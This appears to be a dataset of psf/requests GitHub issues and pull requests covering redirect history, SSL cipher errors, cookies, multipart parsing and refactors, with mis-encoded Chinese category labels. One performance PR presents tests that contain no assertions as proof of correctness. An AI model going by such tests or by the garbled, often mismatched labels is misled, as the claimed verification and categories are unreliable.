# 301 -> https://www.shorturl.at/LvPoU, 302 -> https://www.google.com, 200 https:/www.google.com
In [3]: r = requests.get(""https://shorturl.at/LvPoU"")
In [4]: r.history
Out[4]: [<Response [301]>, <Response [302]>]

In [5]: r.history[0].history
Out[5]: []

In [6]: r.history[1].history
Out[6]: [<Response [302]>] # This should be the 301

# Response shouldn't be in it's own history
# Should be False and return [<Response [301]>]
In [7]: r.history[1].history[0] is r.history[1] 
Out[7]: True

```

## System Information

    $ python -m requests.help

```json
{
  ""chardet"": {
    ""version"": ""5.2.0""
  },
  ""charset_normalizer"": {
    ""version"": ""3.4.0""
  },
  ""cryptography"": {
    ""version"": ""43.0.3""
  },
  ""idna"": {
    ""version"": ""3.10""
  },
  ""implementation"": {
    ""name"": ""CPython"",
    ""version"": ""3.11.4""
  },
  ""platform"": {
    ""release"": ""6.8.0-49-generic"",
    ""system"": ""Linux""
  },
  ""pyOpenSSL"": {
    ""openssl_version"": ""30300020"",
    ""version"": ""24.0.0""
  },
  ""requests"": {
    ""version"": ""2.32.3""
  },
  ""system_ssl"": {
    ""version"": ""30000020""
  },
  ""urllib3"": {
    ""version"": ""2.2.3""
  },
  ""using_charset_normalizer"": false,
  ""using_pyopenssl"": true
}

```

<!-- This command is only available on Requests v2.16.4 and greater. Otherwise,
please provide some basic information about your system (Python version,
operating system, &c). -->
",åŠŸèƒ½å»ºè®®,ä¸­,https://github.com/psf/requests/issues/6855
2737017132,"slowness when writing response text to file, working in one environment but not the other","Please refer to our [Stack Overflow tag](https://stackoverflow.com/questions/tagged/python-requests) for guidance.
Facing a weird issue saving response text for a file. This is working fine in Azure linux but not OCI linux. It took 3 minutes to write to file  on OCI linux and only a second in Azure linux.

OCI Linux version: 
NAME=""Oracle Linux Server""
VERSION=""8.10""

Azure Linux version:
NAME=""Red Hat Enterprise Linux Server""
VERSION=""7.9 (Maipo)""
 
Slow environment, ( OCI Linux)
2024-12-12 17:21:45,545 - 41454 - INFO - file receive starts ::
2024-12-12 17:21:59,420 - 41454 - INFO - file receive success ::
**2024-12-12 17:21:59,420 - 41454 - INFO - file read starts ::
2024-12-12 17:25:00,603 - 41454 - INFO - file read completes** ::
2024-12-12 17:25:00,785 - 41454 - INFO - file write success :: request_test.xml.gz

Working environment (Azure Linux)
2024-12-12 15:44:11,305 - 21602 - INFO - file receive starts ::
2024-12-12 15:44:25,811 - 21602 - INFO - file receive success ::
**2024-12-12 15:44:25,812 - 21602 - INFO - file read starts ::
2024-12-12 15:44:35,759 - 21602 - INFO - file read completes ::**
2024-12-12 15:44:41,446 - 21602 - INFO - file write success :: request_test.xml.gz

Sudo code

res = requests.request(""GET"", url, headers = headers, auth=HTTPBasicAuth(by_username,by_password), data=payload)

logging.info(""file receive success :: "")

if str(res.status_code) == ""200"":
  logging.info(""file read starts :: "" )
  file_data = res.text.encode('utf8')
  #file_data = res.text
  logging.info(""file read completes :: "" )

        #fileName = ftp_path + 'incoming\\' + '_'.join(file) + '.xml.gz'
  fileName = 'request_test' + '.xml.gz'

  #with gzip.open(fileName, ""wb"") as f:
  with open(fileName, ""wb"") as f:
      f.write(file_data)
      #f.write(res.text.encode('utf8'))
","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜, æ€§èƒ½é—®é¢˜",ä¸­,https://github.com/psf/requests/issues/6854
2736695972,Speed up function _init by 11% in src/requests/status_codes.py,"### Reason for Raising the PR

 The changes aim to optimize the given requests library code for better performance and most widely used function status_Code, we think we can make a few improvements. This includes eliminating unnecessary global variable modifications and reducing redundant iterations. Also we have removed the `sorted` function call as `_codes` is statically defined in the code and its keys are already in ascending order, sorting becomes unnecessary. 
 
### ğŸ“„ `_init()` in `src/requests/status_codes.py`

ğŸ“ˆ Performance improved by **`11%`** (**`0.11x` faster**) 
The `_init()` function is executed every time the `requests.status_codes` module is imported. Given the widespread usage of this library, even minor inefficiencies can have a significant cumulative impact across applications.

â±ï¸ Runtime went down from **`4.45 milliseconds`** to **`4.01 milliseconds`** (best of `118` runs on ubuntu machine)


### Changes Made.
1. **Merged Initialization Loops**: Instead of updating the `__doc__` attribute in a separate loop, the document string is constructed during the main loop.
2. **Minimized Global Access**: The global `__doc__` is only modified once after the loop, avoiding repeated global lookups.
3. **Avoided Redundant Code**: Reduced the code by merging the setting of doc lines into a single list append inside the loop.

These changes should make the function more efficient in terms of runtime while preserving the original functionality.


### Correctness verification

The new optimized code was tested for correctness. The results are listed below.
#### ğŸ”˜ (none found) âˆ’ âš™ï¸ Existing Unit Tests
#### âœ… 23 Passed âˆ’ ğŸŒ€ Generated Regression Tests
<details>
<summary>(click to show generated tests)</summary>

```python
import pytest  # used for our unit tests
from src.requests.status_codes import _init

# unit tests

def test_basic_mapping():
    """"""Test basic mappings from _codes to codes.""""""
    _init()
    # Outputs were verified to be equal to the original implementation

def test_uppercase_titles():
    """"""Test that titles not starting with a backslash or slash are set in uppercase.""""""
    _init()
    # Outputs were verified to be equal to the original implementation

def test_special_character_titles():
    """"""Test that titles starting with a backslash or slash are set correctly without uppercase conversion.""""""
    _init()
    # Outputs were verified to be equal to the original implementation

def test_multiple_titles():
    """"""Test that all titles for a given status code are correctly set.""""""
    _init()
    # Outputs were verified to be equal to the original implementation

def test_empty_titles():
    """"""Test the function handles cases where a status code has no titles.""""""
    global _codes
    _codes[999] = ()
    _init()
    # Outputs were verified to be equal to the original implementation

def test_documentation_string():
    """"""Test that the __doc__ string is correctly updated.""""""
    global __doc__
    __doc__ = ""Initial docstring""
    _init()
    # Outputs were verified to be equal to the original implementation

def test_large_scale():
    """"""Test the functionâ€™s performance and scalability with a large number of status codes and titles.""""""
    global _codes
    _codes.update({i: (f""title_{i}"",) for i in range(1000, 2000)})
    _init()
    # Outputs were verified to be equal to the original implementation

def test_global_variable_modification():
    """"""Test that the global __doc__ variable is modified as expected.""""""
    global __doc__
    __doc__ = ""Initial docstring""
    _init()
    # Outputs were verified to be equal to the original implementation

def test_consistency():
    """"""Test that the function always produces the same results for the same input.""""""
    _init()
    first_run = codes.__dict__.copy()
    _init()
    second_run = codes.__dict__.copy()
    # Outputs were verified to be equal to the original implementation

def test_invalid_titles():
    """"""Test the function handles invalid titles gracefully.""""""
    global _codes
    _codes[999] = (None, 123, ""valid_title"")
    _init()
    # Outputs were verified to be equal to the original implementation

def test_complex_titles():
    """"""Test that titles with complex characters are correctly set.""""""
    global _codes
    _codes[600] = (""complex_title"", ""complex-title"")
    _init()
    # Outputs were verified to be equal to the original implementation

def test_lookupdict_integration():
    """"""Test that the codes object, an instance of LookupDict, behaves as expected.""""""
    _init()
    # Outputs were verified to be equal to the original implementation
import pytest  # used for our unit tests
from src.requests.status_codes import _init
# function to test
from src.requests.status_codes import _init

# unit tests

def test_single_alias():
    # Test with a single alias for a code
    global _codes, codes
    _codes = {200: (""ok"",)}
    codes = LookupDict(name=""status_codes"")
    _init()
    # Outputs were verified to be equal to the original implementation

def test_multiple_aliases():
    # Test with multiple aliases for a code
    global _codes, codes
    _codes = {200: (""ok"", ""okay"")}
    codes = LookupDict(name=""status_codes"")
    _init()
    # Outputs were verified to be equal to the original implementation

def test_uppercase_alias():
    # Test that uppercase aliases are also set
    global _codes, codes
    _codes = {200: (""ok"",)}
    codes = LookupDict(name=""status_codes"")
    _init()
    # Outputs were verified to be equal to the original implementation

def test_special_characters():
    # Test that aliases with special characters are set correctly
    global _codes, codes
    _codes = {200: (""\\o/"", ""âœ“"")}
    codes = LookupDict(name=""status_codes"")
    _init()
    # Outputs were verified to be equal to the original implementation

def test_empty_aliases():
    # Test with an empty alias tuple
    global _codes, codes
    _codes = {999: ()}
    codes = LookupDict(name=""status_codes"")
    _init()
    # Outputs were verified to be equal to the original implementation

def test_conflicting_aliases():
    # Test with conflicting aliases
    global _codes, codes
    _codes = {200: (""ok"",), 400: (""ok"", ""bad"")}
    codes = LookupDict(name=""status_codes"")
    _init()
    # Outputs were verified to be equal to the original implementation

def test_same_name_different_cases():
    # Test with aliases that have the same name but different cases
    global _codes, codes
    _codes = {200: (""ok"",), 201: (""OK"",)}
    codes = LookupDict(name=""status_codes"")
    _init()
    # Outputs were verified to be equal to the original implementation

def test_doc_none():
    # Test when __doc__ is initially None
    global __doc__
    __doc__ = None
    _init()
    # Outputs were verified to be equal to the original implementation

def test_doc_non_none():
    # Test when __doc__ is initially non-None
    global __doc__
    __doc__ = ""Initial Doc""
    _codes = {200: (""ok"",)}
    codes = LookupDict(name=""status_codes"")
    _init()
    # Outputs were verified to be equal to the original implementation

def test_large_scale():
    # Test with a large number of codes and aliases
    global _codes, codes
    _codes = {i: (f""alias_{i}"",) for i in range(1000)}
    codes = LookupDict(name=""status_codes"")
    _init()
    for i in range(1000):
        pass
    # Outputs were verified to be equal to the original implementation
```
</details>
","åŠŸèƒ½å»ºè®®, æ–‡æ¡£é—®é¢˜, æ€§èƒ½é—®é¢˜",ä¸­,https://github.com/psf/requests/pull/6853
2724746837,Simplify from_key_val_list doctest to work across all Python 3.8+ versions,"Simplifies the doctest for the `from_key_val_list` function to ensure compatibility across all Python 3.8+ versions, particularly addressing the inconsistency in how `OrderedDict` is represented in Python 3.8+ versus earlier versions.

### Representation Differences:
Starting from Python 3.8, the string representation of an OrderedDict has changed slightly.
In earlier versions, OrderedDict objects were represented as:
```python
OrderedDict([('key', 'val')])
```
In Python 3.8 and later, the `OrderedDict` has a more streamlined string representation, shown as:
```python
OrderedDict({'key': 'val'})
```

The Python 3.8 and lower versions are [already considered End of Life by Python](https://devguide.python.org/versions/), so there is no need to build the test around the older representation for OrderedDict.",æ–‡æ¡£é—®é¢˜,ä½,https://github.com/psf/requests/pull/6839
2719927829,v 2.32.3 sends multiple requests,"I am working with quite an old and slow API -- [GDELT](https://blog.gdeltproject.org/gdelt-doc-2-0-api-debuts/). I am trying to send a single get request. However, in response, I get a message that I send too many requests at the same time. I suspect that it is the issue of the timeout settings but setting it to very liberal values for example 3 and 27 does not really help. I think the issue appeared somewhere between versions 2.31.0 and 2.32.3 because this occurs only in the latter.

## Expected Result

Send a single get request.

## Actual Result

For some reason, API returns a message of multiple requests sent. Therefore, I suspect that the timeout option does not work properly. In other words, requests do not wait long enough for the response before sending a repetitive request.

## Reproduction Steps

```python
import requests as rq

API_URL = ""https://api.gdeltproject.org/api/v2/doc/doc?""
query = {""query"" : ""human"", ""format"" : ""JSON""}

response = rq.get(API_URL, query, timeout = (3,27))
```

## System Information

For the sake of reproducibility, I tested it in Google Colab.

```json
{
  ""chardet"": {
    ""version"": ""5.2.0""
  },
  ""charset_normalizer"": {
    ""version"": ""3.4.0""
  },
  ""cryptography"": {
    ""version"": ""43.0.3""
  },
  ""idna"": {
    ""version"": ""3.10""
  },
  ""implementation"": {
    ""name"": ""CPython"",
    ""version"": ""3.10.12""
  },
  ""platform"": {
    ""release"": ""6.1.85+"",
    ""system"": ""Linux""
  },
  ""pyOpenSSL"": {
    ""openssl_version"": ""30300020"",
    ""version"": ""24.2.1""
  },
  ""requests"": {
    ""version"": ""2.32.3""
  },
  ""system_ssl"": {
    ""version"": ""30000020""
  },
  ""urllib3"": {
    ""version"": ""2.2.3""
  },
  ""using_charset_normalizer"": false,
  ""using_pyopenssl"": true
}
```

<!-- This command is only available on Requests v2.16.4 and greater. Otherwise,
please provide some basic information about your system (Python version,
operating system, &c). -->
","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, ç½‘ç»œè¿æ¥å¤±è´¥, æ–‡æ¡£é—®é¢˜, æ€§èƒ½é—®é¢˜",ä¸­,https://github.com/psf/requests/issues/6838
2714817608,Fix handling of non-latin credentials in HTTPDigestAuth,"Fixes #6102

Update `HTTPDigestAuth` to handle non-latin credentials correctly.

* Change `_basic_auth_str` in `src/requests/auth.py` to encode `username` and `password` using `utf-8` instead of `latin1`.
* Update `build_digest_header` in `src/requests/auth.py` to correctly format the string for the header with non-latin characters.
* Add tests in `tests/test_requests.py` to verify correct handling of non-latin credentials in `HTTPDigestAuth`.","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜",ä¸­,https://github.com/psf/requests/pull/6837
2712663600,Refactor string formatting to use f-strings for improved readability,"### Description:
This pull request refactors the code to replace the `.format()` method with f-strings for string interpolation. The changes enhance the readability and simplicity of the code by using the more modern and efficient f-strings, which provide a cleaner way to embed expressions inside string literals.

- **String formatting update**: All instances of `.format()` have been replaced with f-strings for more concise and readable code across the entire project.
- **Consistency improvement**: The codebase now consistently uses f-strings, making the code easier to maintain and improving overall clarity.

These changes aim to modernize the codebase, improve readability, and ensure consistency, without altering any existing functionality.
",åŠŸèƒ½å»ºè®®,é«˜,https://github.com/psf/requests/pull/6836
2703928283,why requests.session doesn't send stored cookie?,"Here is a reproducible example:

- server.py

```python
from flask import request, make_response, Flask
import json as j

app = Flask(__name__)

@app.route('/set')
def set_cookie():
  cookie = {}
  resp = make_response('')
  for k, v in request.args.items():
    resp.set_cookie(k, v, domain='localhost', samesite='lax', secure=False)
  return resp

@app.route('/get')
def get_cookie():
  cookie = j.dumps(dict(request.cookies), indent=2)
  print('Cookie:', cookie)
  return cookie

if __name__ == ""__main__"":
    app.run(host='0.0.0.0')
```

- client.py

```python
from requests import session as s

session = s()

response1 = session.get('http://localhost:5000/set?AAA=BBB&EEE=FFF')

print('Response headers:', response1.headers)
print('Session cookies:', session.cookies)

response2 = session.get('http://localhost:5000/get')

print('Second request headers:', response2.request.headers)
```

And logs:

- SERVER

```text
127.0.0.1 - - [29/Nov/2024 14:19:55] ""GET /set?AAA=BBB&EEE=FFF HTTP/1.1"" 200 -
Cookie: {}
127.0.0.1 - - [29/Nov/2024 14:19:55] ""GET /get HTTP/1.1"" 200 -
```

- CLIENT

```text
Response headers: {'Server': 'Werkzeug/3.0.1 Python/3.11.7', 'Date': 'Fri, 29 Nov 2024 05:19:55 GMT', 'Content-Type': 'text/html; charset=utf-8', 'Content-Length': '0', 'Set-Cookie': 'AAA=BBB; Domain=localhost; Path=/; SameSite=Lax, EEE=FFF; Domain=localhost; Path=/; SameSite=Lax', 'Connection': 'close'}
Session cookies: <RequestsCookieJar[<Cookie AAA=BBB for .localhost/>, <Cookie EEE=FFF for .localhost/>]>
Second request headers: {'User-Agent': 'python-requests/2.31.0', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive'}
```

Why `session` doesn't send stored cookies at second request? More over, why domain looks like `.localhost` inside session cookies. I set it as `Domain=localhost` (without leading dot).

requests version - 2.31.0","åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜, ç½‘ç»œè¿æ¥å¤±è´¥, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/issues/6835
2699732478,multipart response preserve carriage return linefeed pairs,"Hi, 
Trying to process the response that is a multipart/form-data.  
```
    multipart_data = MultipartDecoder.from_response(response)
    for part in multipart_data.parts:
        print(part.content)
        print(part.headers)
```
which fails with ```requests_toolbelt.multipart.decoder.ImproperBodyPartContentException: content does not contain CR-LF-CR-LF```
And when I try to get to the body of the response(runtime version 2.32.3) any other way the ""\r\n""'s don't exist.
response headers are
```
HTTPHeaderDict({'Content-Length': '120640', 'Connection': 'Keep-Alive', 'Content-Type': 'multipart/form-data; boundary=e9bb939421e7436ebdbec45d4142245e'})
status=200
```
Started with conda env yesterday
```
conda create -n pytest_env python
conda activate pytest_env
conda install -c conda-forge requests-toolbelt pytest requests -y
```
```
        response = requests.post(
            endpoint,
            data=mpb,
            headers=headers,
            verify=False,  # Disable SSL verification for HTTPS
            timeout=50,  # Set timeout to 50 seconds
            stream=True
        )
```
is the POST request and it sends over a multpart via toolbelt's MultipartEncoder.

After response returns tried sending content to binary file out and see no ""\r\n""'s there either.
```
    with open(""debug.txt"", ""wb"") as debug_file:
        for chunk in response:
            debug_file.write(chunk)
```

I've written nodejs & Java clients that leave the response ""\r\n""'s alone and I have choices of how the response body gets processed.

Is there a setting for requests that corrects this behavior?  Many suggestions out on the wild web but none successful so far
","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, ç½‘ç»œè¿æ¥å¤±è´¥",ä¸­,https://github.com/psf/requests/issues/6834
2692199184,Lack of respect for questions and support requests,"Sincerely, I don't know what is the objective of those responsible for https://github.com/psf/requests, if they don't know how to kill this project, if they are bored or if they are simply busier with other things.

I have been observing your behavior for some time now, and it worries me:

.- Don't you have time to develop this library?: **perfect**.
.- Don't you want to continue to be responsible for it?: **perfect**.
.- Don't you know how to respond to support requests?: **perfect**.

But don't automatically refer support requests or problems to https://stackoverflow.com/: one of the most aggressive and rude sites when faced with support questions, especially from those who are just starting to program.

You should rethink, seriously, what to do with https://github.com/psf/requests: it is **far** behind other libraries that provide current functionalities, it is **far** behind for commits that really provide usefulness (you have been *months* without contributing anything useful to this library).

If you are tired, **perfect**: say it widely. And allow others to **continue** the work: people with enthusiasm and time to maintain and improve this library as it deserves.

Because our time is also **important**: don't give an image of an updated, friendly and supported library; because that's not the reality I see.

And this is said by someone who has recognized all your work: but sometimes it is **wise** to know when to give way to other people. And I maintain, on github, a project infinitely smaller than yours, but the moment I lose the illusion, the desire, the smile, to respond to every PR, every Issue, every suggestion, at that moment I will **hang up the gloves**, allowing wiser people to continue the path.


Regards,","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®",é«˜,https://github.com/psf/requests/issues/6833
2686853462,CURL and Requests.session() returning different values during SSL and CA verification,"<!-- Summary. -->
I don't know if anyone has seen this happen. but when i'm using Requests.Session() for making a requests to HTTPS URL with SSL certificate and CA cert verification it doesn't give correct response. 
Whereas when i use the same certs(SSL and CA Cert) with CURL command it works seamlessly.  


This is causing https://github.com/confluentinc/confluent-kafka-python/issues/1850

## Expected Result

<!-- What you expected. -->
Requests.Session() should work and not respond with a SSL Verification Error

## Actual Result

<!-- What happened instead. -->
SSLVerificationError

## Reproduction Steps
No actual steps but try making a API call to HTTPS url with SSL Verification and CA Cert. 
","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®",é«˜,https://github.com/psf/requests/issues/6832
2674239709,"Support for ""DEFAULT_CIPHERS"" requests > 2.31.0 is broken","GNU/Linux, deb, Python 3.8
Android/Termux, Python 3.11.5

Urllib3 = 1.26.18, 1.26.20
Requests = 2.32.3

```python
import requests
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ':!DH'
print(requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS)
```
>ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:ECDH+AESGCM:DH+AESGCM:ECDH+AES:DH+AES:RSA+AESGCM:RSA+AES:!aNULL:!eNULL:!MD5:!DSS:!DH

```python
r = requests.get(""https://nhl.ru"")
```
>SSLError(SSLError(1, '[SSL: DH_KEY_TOO_SMALL]

Solution: roll back to Requests 2.31.0
Reported: https://github.com/psf/requests/issues/6827","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®",ä¸­,https://github.com/psf/requests/issues/6831
2669252228,PreparedRequests can't bypass URL normalization when proxies are used,"Related to #5289, where [akmalhisyam found a way to bypass URL normalization using PreparedRequests](https://github.com/psf/requests/issues/5289#issuecomment-573632625), however, the solution doesn't work when you have proxies provided.

## Expected Result

This should be able to explicitly set the request URL without getting normalized (from `/../something.txt` to `/something.txt`)
```
url = ""http://example.com/../something.txt""
s = requests.Session()
req = requests.Request(method='POST' ,url=url, headers=headers, data=data)
prep = req.prepare()
prep.url = url
r = s.send(prep, proxies={""http"": ""http://127.0.0.1""}, verify=False)
```

## Actual Result

The code above doesn't work, this one works though:

```
url = ""http://example.com/../something.txt""
s = requests.Session()
req = requests.Request(method='POST' ,url=url, headers=headers, data=data)
prep = req.prepare()
prep.url = url
r = s.send(prep, verify=False)
```

## Reproduction Steps

Use the code in **Expected Result** and check your proxy request log, you will see it doesn't work

## System Information

    $ python -m requests.help

```json
{
  ""chardet"": {
    ""version"": ""5.2.0""
  },
  ""charset_normalizer"": {
    ""version"": ""2.0.12""
  },
  ""cryptography"": {
    ""version"": ""38.0.4""
  },
  ""idna"": {
    ""version"": ""3.4""
  },
  ""implementation"": {
    ""name"": ""CPython"",
    ""version"": ""3.11.4""
  },
  ""platform"": {
    ""release"": ""4.4.0-19041-Microsoft"",
    ""system"": ""Linux""
  },
  ""pyOpenSSL"": {
    ""openssl_version"": ""30000080"",
    ""version"": ""21.0.0""
  },
  ""requests"": {
    ""version"": ""2.32.3""
  },
  ""system_ssl"": {
    ""version"": ""30000030""
  },
  ""urllib3"": {
    ""version"": ""2.0.4""
  },
  ""using_charset_normalizer"": false,
  ""using_pyopenssl"": true
}
```","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, ç½‘ç»œè¿æ¥å¤±è´¥, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/issues/6830
2667042673,Code Refactoring and Enhancements for Improved Maintainability,"Hello Maintainers,

I hope you're doing well! I'm submitting this pull request to contribute some code enhancements and improvements to the requests repository:

- Code Style and Quality Improvements: After running flake8, I have fixed several style issues to align the code with PEP 8 standards, improving readability and maintainability.
- Documentation Enhancements: Minor updates to comments and docstrings to improve code clarity, ensuring that the repository remains accessible for new contributors.

These changes should make the repository more maintainable, improve code quality, and contribute to a better experience for all developers and contributors. I believe these enhancements follow good practices in open-source software and will improve the overall readability and consistency of the codebase.

If any adjustments or further refinements are needed, please feel free to reach outâ€”Iâ€™m happy to assist!

Thank you for considering these contributions. I look forward to your feedback.

Best regards,
Alina","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/pull/6829
2665892186,AssertionError on malformed URL through a proxy,"
Unsure whether this is the right place to handle this error â€“ happy to report this elsewhere if you disagree.

When opening a request with a malformed URL through a proxy, an AssertionError from deep in the http library is reported.


## Expected Result

`ConnectionError`, `NameResolutionError` or something more indicative of what the problem is

## Actual Result

`AssertionError: b''`

## Reproduction Steps

```python
import requests

requests.get(""http://%C2%A0www.github.com/"", proxies=client.proxies)
^[[H---------------------------------------------------------------------------
AssertionError                            Traceback (most recent call last)
Cell In[36], line 1
----> 1 requests.get(""http://%C2%A0www.github.com/"", proxies=client.proxies)

File /opt/venv/lib/python3.12/site-packages/requests/api.py:73, in get(url, params, **kwargs)
     62 def get(url, params=None, **kwargs):
     63     r""""""Sends a GET request.
     64
     65     :param url: URL for the new :class:`Request` object.
   (...)
     70     :rtype: requests.Response
     71     """"""
---> 73     return request(""get"", url, params=params, **kwargs)

File /opt/venv/lib/python3.12/site-packages/requests/api.py:59, in request(method, url, **kwargs)
     55 # By using the 'with' statement we are sure the session is closed, thus we
     56 # avoid leaving sockets open which can trigger a ResourceWarning in some
     57 # cases, and look like a memory leak in others.
     58 with sessions.Session() as session:
---> 59     return session.request(method=method, url=url, **kwargs)

File /opt/venv/lib/python3.12/site-packages/requests/sessions.py:589, in Session.request(self, method, url, params, data, headers, cookies, files, auth, timeout, allow_redirects, proxies, hooks, stream, verify, cert, json)
    584 send_kwargs = {
    585     ""timeout"": timeout,
    586     ""allow_redirects"": allow_redirects,
    587 }
    588 send_kwargs.update(settings)
--> 589 resp = self.send(prep, **send_kwargs)
    591 return resp

File /opt/venv/lib/python3.12/site-packages/requests/sessions.py:703, in Session.send(self, request, **kwargs)
    700 start = preferred_clock()
    702 # Send the request
--> 703 r = adapter.send(request, **kwargs)
    705 # Total elapsed time of the request (approximately)
    706 elapsed = preferred_clock() - start

File /opt/venv/lib/python3.12/site-packages/requests/adapters.py:667, in HTTPAdapter.send(self, request, stream, timeout, verify, cert, proxies)
    664     timeout = TimeoutSauce(connect=timeout, read=timeout)
    666 try:
--> 667     resp = conn.urlopen(
    668         method=request.method,
    669         url=url,
    670         body=request.body,
    671         headers=request.headers,
    672         redirect=False,
    673         assert_same_host=False,
    674         preload_content=False,
    675         decode_content=False,
    676         retries=self.max_retries,
    677         timeout=timeout,
    678         chunked=chunked,
    679     )
    681 except (ProtocolError, OSError) as err:
    682     raise ConnectionError(err, request=request)

File /opt/venv/lib/python3.12/site-packages/urllib3/connectionpool.py:789, in HTTPConnectionPool.urlopen(self, method, url, body, headers, retries, redirect, assert_same_host, timeout, pool_timeout, release_conn, chunked, body_pos, preload_content, decode_content, **response_kw)
    786 response_conn = conn if not release_conn else None
    788 # Make the request on the HTTPConnection object
--> 789 response = self._make_request(
    790     conn,
    791     method,
    792     url,
    793     timeout=timeout_obj,
    794     body=body,
    795     headers=headers,
    796     chunked=chunked,
    797     retries=retries,
    798     response_conn=response_conn,
    799     preload_content=preload_content,
    800     decode_content=decode_content,
    801     **response_kw,
    802 )
    804 # Everything went great!
    805 clean_exit = True

File /opt/venv/lib/python3.12/site-packages/urllib3/connectionpool.py:495, in HTTPConnectionPool._make_request(self, conn, method, url, body, headers, retries, timeout, chunked, response_conn, preload_content, decode_content, enforce_content_length)
    492 # conn.request() calls http.client.*.request, not the method in
    493 # urllib3.request. It also calls makefile (recv) on the socket.
    494 try:
--> 495     conn.request(
    496         method,
    497         url,
    498         body=body,
    499         headers=headers,
    500         chunked=chunked,
    501         preload_content=preload_content,
    502         decode_content=decode_content,
    503         enforce_content_length=enforce_content_length,
    504     )
    506 # We are swallowing BrokenPipeError (errno.EPIPE) since the server is
    507 # legitimately able to close the connection after sending a valid response.
    508 # With this behaviour, the received response is still readable.
    509 except BrokenPipeError:

File /opt/venv/lib/python3.12/site-packages/urllib3/connection.py:403, in HTTPConnection.request(self, method, url, body, headers, chunked, preload_content, decode_content, enforce_content_length)
    401 skip_accept_encoding = ""accept-encoding"" in header_keys
    402 skip_host = ""host"" in header_keys
--> 403 self.putrequest(
    404     method, url, skip_accept_encoding=skip_accept_encoding, skip_host=skip_host
    405 )
    407 # Transform the body into an iterable of sendall()-able chunks
    408 # and detect if an explicit Content-Length is doable.
    409 chunks_and_cl = body_to_chunks(body, method=method, blocksize=self.blocksize)

File /opt/venv/lib/python3.12/site-packages/urllib3/connection.py:347, in HTTPConnection.putrequest(self, method, url, skip_host, skip_accept_encoding)
    342 if match:
    343     raise ValueError(
    344         f""Method cannot contain non-token characters {method!r} (found at least {match.group()!r})""
    345     )
--> 347 return super().putrequest(
    348     method, url, skip_host=skip_host, skip_accept_encoding=skip_accept_encoding
    349 )

File /usr/local/lib/python3.12/http/client.py:1214, in HTTPConnection.putrequest(self, method, url, skip_host, skip_accept_encoding)
   1212     except UnicodeEncodeError:
   1213         netloc_enc = netloc.encode(""idna"")
-> 1214     self.putheader('Host', _strip_ipv6_iface(netloc_enc))
   1215 else:
   1216     if self._tunnel_host:

File /usr/local/lib/python3.12/http/client.py:179, in _strip_ipv6_iface(enc_name)
    177 enc_name, percent, _ = enc_name.partition(b""%"")
    178 if percent:
--> 179     assert enc_name.startswith(b'['), enc_name
    180     enc_name += b']'
    181 return enc_name

AssertionError: b''

```

## System Information

    $ python -m requests.help

```json{
  ""chardet"": {
    ""version"": null
  },
  ""charset_normalizer"": {
    ""version"": ""3.4.0""
  },
  ""cryptography"": {
    ""version"": """"
  },
  ""idna"": {
    ""version"": ""3.10""
  },
  ""implementation"": {
    ""name"": ""CPython"",
    ""version"": ""3.12.7""
  },
  ""platform"": {
    ""release"": ""6.8.0-36-generic"",
    ""system"": ""Linux""
  },
  ""pyOpenSSL"": {
    ""openssl_version"": """",
    ""version"": null
  },
  ""requests"": {
    ""version"": ""2.32.3""
  },
  ""system_ssl"": {
    ""version"": ""1010117f""
  },
  ""urllib3"": {
    ""version"": ""2.2.3""
  },
  ""using_charset_normalizer"": true,
  ""using_pyopenssl"": false
}
```

<!-- This command is only available on Requests v2.16.4 and greater. Otherwise,
please provide some basic information about your system (Python version,
operating system, &c). -->
","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜, ç½‘ç»œè¿æ¥å¤±è´¥",ä¸­,https://github.com/psf/requests/issues/6828
2661550988,"SSL: DH_KEY_TOO_SMALL, Requests > 2.31.0","How to make requests to problematic sites (on old versions disabling shfires helped)?

`import requests, urllib3`

`print(f""requests={requests.__version__}, urllib3={urllib3.__version__}"")`
requests=**2.32.3**, urllib3=**1.26.18** (This version of Urllib3 still supports custom cipher selection.)

`requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'`

Error:
`print(requests.get(""https://nhl.ru""))`
SSLError(SSLError(1, '[SSL: DH_KEY_TOO_SMALL] dh key too small (_ssl.c:1125)')))

-----

`python -m pip install requests==2.31.0`

import requests, urllib3

`print(f""requests={requests.__version__}, urllib3={urllib3.__version__}"")`
requests=**2.31.0**, urllib3=**1.26.18**

`requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'`

Good:
`print(requests.get(""https://nhl.ru""))`
<Response [404]>

-----

The latest version that works with the cipher changes Requests=2.31.0 and urllib3=1.26.18.

If you update, requests are bad: ('SSL: DH_KEY_TOO_SMALL')

Is there a way to make successful requests to old sites by playing with SSL (at the Python level, not the OS?).

For example:
Good:
`curl -vLk ""http://nhl.ru/"" --ciphers 'DEFAULT:!DH'`","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/issues/6827
2653925463,multipart/form-data and a generator...,"I used a generator as an argument to data for Content-Type application/json, and that worked fine.

The problem now is that I need to do this for multipart/form-data, and it appears to not support a generator.

- I tried files={'content': my_generator_func()} and got: a bytes-like object is required, not 'generator'; so it looks like it would have accepted a file descriptor, but not a generator.

- I then tried a generator for the data argument, and set the files argument to a form name and value: files={'encoding': (None, 'base64')} [I read you have to use the files argument to get requests to do multipart/form-data]  For that I get the error ""Streamed bodies and files are mutually exclusive"".

